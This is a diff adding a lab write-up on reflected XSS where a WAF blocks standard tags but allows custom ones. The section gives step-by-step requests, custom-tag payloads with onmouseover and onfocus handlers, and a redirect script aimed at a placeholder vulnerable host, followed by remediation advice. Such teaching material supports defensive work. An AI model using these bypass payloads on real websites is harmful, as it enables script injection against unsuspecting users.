@@ -488,3 +488,49 @@ In this instance, the `/?search` parameter is being reflected into the page as H
 **Suggestion**: Remediate by [treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy) (encode/escape for the HTML context or render search terms as text nodes, never raw HTML), apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required), enforce a strong [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts, and [harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.
 
 -
+
+#### 13. Reflected XSS into HTML context with all tags blocked except custom ones
+In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.
+
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+1. I started by testing the input form, and the response indicated that the tag was blocked.
+   ~~~
+   Request: GET /?search=<script>test</script>
+   Response: "Tag is not allowed"
+   ~~~
+
+2. Then I tried using a custom tag (`<cust-foo>`); this time, I did not receive any error. This confirms that the WAF does not block [custom tag](https://matthewjamestaylor.com/custom-tags).
+
+   ~~~
+   Request: GET /?search=<cust-foo>test</cust-foo>
+   Response: HTTP/2 200 OK
+   ~~~
+
+3. The browser treats custom tags (`<cust-foo>`) as valid HTML elements and parses their attributes and event handlers (`onmouseover`), which execute JavaScript when triggered by moving the cursor over a specific spot.
+   ~~~
+   Request: GET /?search=<cust-foo onmouseover='prompt("xss")'>Move your mouse here</cust-foo>
+   Response: A pop-up "xss"
+   ~~~
+
+4. To make the exploitation more realistic, I used custom tags with some components to create an .html file. As soon as a user opens it, they woulbe be redirected to the designated page and the prompt was executed: 
+   - `window.location.assign()`: Redirect the user's browser to a new URL while keeping the current page in the session history (Back button available).
+   - `id`: Gives the element a unique identifier in the DOM (e.g., a1).
+   - `tabindex`: Makes the element focusable, which can be used with `onfocus` events.
+   - `onfocus`: The JavaScript will be triggered when the element (`id`) receives focus.
+   - `#a1`: Call out and focus on the element `a1`.
+
+   ```javascript
+    <script>
+    window.location.assign("https[://]vulnerable[.]com/?search=<cust-tag id=a1 tabindex=1 onfocus='prompt("I am focusable")'>#a1")
+    </script>
+   ```
+   
+</details>
+
+**Suggestion**: Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) on output that must contain HTML (server-side). Configure [allowlists](https://help.ivanti.com/ht/help/en_US/ISM/2025/admin-user/Content/Configure/SetUpWizard/Configure%20Allowed%20Tags%20and%20Attribute.htm), only permit required tags and attributes, and explicitly exclude all event handler attributes (e.g., on*). Apply the appropriate [encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) based on where the data will be used (body, attribute, JavaScript string, URL, CSS), and do not rely on a single generic encoding for all contexts. Prefer [framework helpers](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security) and templating engines that provide automatic, correct output escaping rather than hand‑rolling your own escaping logic. Remove unnecessary HTML rendering of user‑supplied content whenever possible. If a field is a search query or otherwise simple text, return it as plain text (properly escaped) instead of rendering it as HTML with tags.
+
+-
+
+
